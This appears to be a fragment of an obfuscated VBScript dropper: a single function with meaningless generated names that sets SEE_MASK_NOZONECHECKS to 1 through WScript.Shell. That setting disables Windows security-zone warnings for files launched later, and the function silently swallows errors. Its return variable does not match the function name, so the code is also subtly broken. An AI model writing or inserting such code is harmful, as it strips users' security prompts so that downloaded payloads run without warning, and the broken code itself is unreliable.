Function FetchPolicyBlock91()
On Error Resume Next
  Dim strSync612,strSync5,strBlock875
  Set strSync612=CreateObject("WScript.Shell")
  strSync5=strSync612.ExpandEnvironmentStrings("%TEMP%")
  strBlock875=strSync612.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strSync5)>0 And Len(strBlock875)>0 Then
    strSync612.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    DecodeManifest52=1
    Exit Function
  End If
  DecodeManifest52=0
End Function

